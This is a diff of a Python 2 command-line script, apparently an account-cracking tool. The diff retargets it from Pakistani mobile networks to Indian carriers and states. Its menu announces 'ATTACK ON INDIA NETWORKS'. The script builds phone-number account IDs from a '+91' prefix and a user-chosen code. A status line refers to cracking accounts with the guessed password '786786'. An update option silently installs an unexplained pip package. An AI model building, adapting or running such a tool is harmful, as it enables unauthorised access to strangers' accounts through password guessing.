@@ -1,6 +1,4 @@
-# Decompiled By RandiSr
-# Github : https://github.com/RANDIOLOY
- 
+
 #!/usr/bin/python2
 #coding=utf-8
 #The Credit For This Code Goes To Arbab Ali
@@ -83,33 +81,40 @@ id = []
 def menu():
 	os.system('clear')
 	print logo
-	print "\033[1;92mCYBER_HACKER_GLAXY_R.H.P_1.286-Wellcome"
+	print "\033[1;92mCYBER_HACKER_GLAXY_R.H.P_1.286-MOST-WELCOME"
 	print
-        print "\033[1;91mATTACK ON PAKISTAN NETWORKS"
-	print "\033[1;92m[1]  MOBILINK"
-	print "\033[1;92m[2]  TELINOR"
-	print "\033[1;92m[3]  WARID"
-	print "\033[1;92m[4]  UFONE"
-	print "\033[1;92m[5]  ZONG"
-	print "\033[1;92m[6]  UPDATE SYSTEM"
-	print "\033[1;92m[0]  EXIT_KALTI MAR"	    
+        print "\033[1;91mATTACK ON INDIA NETWORKS"
+	print "\033[1;92m[01]  AIRTEL"
+	print "\033[1;92m[02]  BSNL"
+	print "\033[1;92m[03]  JIO"
+	print "\033[1;92m[04]  VI"
+	print
+	print "\033[1;93m ATTACK ON INDIAN STATE"
+	print "\033[1;91m[05]  KARNATAKA"
+	print "\033[1;91m[06]  BANGLORE"
+	print "\033[1;91m[07]  BHOJPURI"
+	print "\033[1;91m[08]  GUJRAT"
+	print "\033[1;91m[09]  TAMIL"
+	print "\033[1;91m[10]  TELGU"
+	print "\033[1;92m[5]   UPDATE SYSTEM"
+	print "\033[1;92m[00]  EXIT_KALTI MAR"	    
 	print 50*'-'
 	action()
 	
 def action():	
-	bch = raw_input('\n  ENTER HERE ANY NUMBER ')
+	bch = raw_input('\n  ENTER HERE ANY NUMBER.. ')
 	if bch =='':
 		print '[!] Fill in correctly'
 		action()
-	elif bch =="1":
+	elif bch =="01":
 		os.system("clear")
 		print (logo)
-		print "\033[1;91mMOBILINK/JAZZ CODE HERE"		
-		print "\033[1;95m00, 01, 02, 03, 04,"
-		print "\033[1;95m05, 06, 07, 08, 09,"
+		print "\033[1;91mAIRTEL CODE HERE"		
+		print "\033[1;95mENTER HERE ANY CODE WITHOUT 91"
+		print "\033[1;95mARBAB MEMON........"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+91"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -117,15 +122,15 @@ def action():
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
 			menu()
-	elif bch =="2":			
+	elif bch =="02":			
 		os.system("clear")
 		print (logo)
-		print "\033[1;91mTELINORE CODE HERE"		
-		print "\033[1;94m40, 41, 42, 43, 44,"
-		print "\033[1;95m45, 64, ??, ??, ??,"
+		print "\033[1;91mBSNL CODE HERE"		
+		print "\033[1;94mENTER HERE CODE"
+		print "\033[1;95mWITHOUT COUNTRY CODE"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+91"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -133,15 +138,15 @@ def action():
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
 			menu()
-	elif bch =="3":			
+	elif bch =="03":			
 		os.system("clear")
 		print (logo)
-		print "\033[1;91mWARID CODE HERE"		
-		print "\033[1;94m20, 21, 22, 23,"
-		print "\033[1;95m24, ??, ??, ??,"
+		print "\033[1;91mJIO CODE HERE"		
+		print "\033[1;94mWITHOUT COUNTRY CODE"
+		print "\033[1;95mARBAB ALI MEMON"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+91"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -149,15 +154,15 @@ def action():
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
 			menu()	
-	elif bch =="4":			
+	elif bch =="04":			
 		os.system("clear")
 		print (logo)
-		print "\033[1;91mUFONE CODE HERE"		
-		print "\033[1;94m31, 32, 33, 34,"
-		print "\033[1;95m35, 36, 37, ??,"
+		print "\033[1;91mVI CODE HERE"		
+		print "\033[1;94mWITHOUT COUNTRY CODE"
+		print "\033[1;95mARBAB ALI MEMON"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+91"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -165,15 +170,15 @@ def action():
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
 			menu()	
-	elif bch =="5":			
+	elif bch =="05":			
 		os.system("clear")
 		print (logo)
-		print "\033[1;91mZONG CODE HERE"		
-		print "\033[1;94m10, 11, 12, 13,"
-		print "\033[1;95m14, 15, 16, 17,"
+		print "\033[1;91mKARNATAKA CODE HERE"		
+		print "\033[1;94mWITHOUT COUNTRY CODE"
+		print "\033[1;95mARBAB ALI MEMON"
 		try:
 			c = raw_input(" SELECTED CODE: ")
-			k="+923"
+			k="+91"
 			idlist = ('.txt')
 			for line in open(idlist,"r").readlines():
 				id.append(line.strip())
@@ -181,7 +186,87 @@ def action():
 			print ("[!] File Not Found")
 			raw_input("\n[ Back ]")
 			menu()
-	elif bch =="6":
+	elif bch =="06":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mBANGLORE CODE HERE"		
+		print "\033[1;94mWITHOUT COUNTRY CODE"
+		print "\033[1;95mARBAB ALI MEMON"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+91"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif bch =="07":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mBHOJPURI CODE HERE"		
+		print "\033[1;94mWITHOUT COUNTRY CODE"
+		print "\033[1;95mARBAB ALI MEMON"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+91"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif bch =="08":				
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mGUJRAT CODE HERE"		
+		print "\033[1;94mWITHOUT COUNTRY CODE"
+		print "\033[1;95mARBAB ALI MEMON"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+91"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()	
+	elif bch =="09":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mTAMIL CODE HERE"		
+		print "\033[1;94mWITHOUT+91 ADD HERE ANY"
+		print "\033[1;95mARBAB ALI MEMON"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+91"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()
+	elif bch =="10":			
+		os.system("clear")
+		print (logo)
+		print "\033[1;91mTELGU CODE HERE"		
+		print "\033[1;94m+91 DONT USE SELECT ANY CODE"
+		print "\033[1;95mARBAB AlI MEMON"
+		try:
+			c = raw_input(" SELECTED CODE: ")
+			k="+91"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			menu()		
+	elif bch =="11":
 	    os.system("clear")
 	    os.system("pip2 install --upgrade balln")
 	    os.system("pip2 install --upgrade balln")
@@ -195,7 +280,7 @@ def action():
 #	    os.system('xdg-open https://www.facebook.com/100002059014174/posts/2677733205638620/?substory_index=0&app=fbl')
 #	    time.sleep(1)
 #	    menu()
-	elif bch =='0':
+	elif bch =='00':
 		exb()
 	else:
 		print '[!] Fill in correctly'
@@ -206,7 +291,7 @@ def action():
 	time.sleep(0.5)
 	psb ('[✓] Please wait, process is running ...')
 	time.sleep(0.5)
-	psb ('[✓] Last 07 Digit Crack,786786,Pakistan Found ...')
+	psb ('[✓] Last 07 Digit Crack,786786,Bharat Found ...')
 	time.sleep(0.5)
 	psb ('[!] Kalti Marne Ke lye(To Exit) Press CTRL Then Press z')
 	time.sleep(0.5)
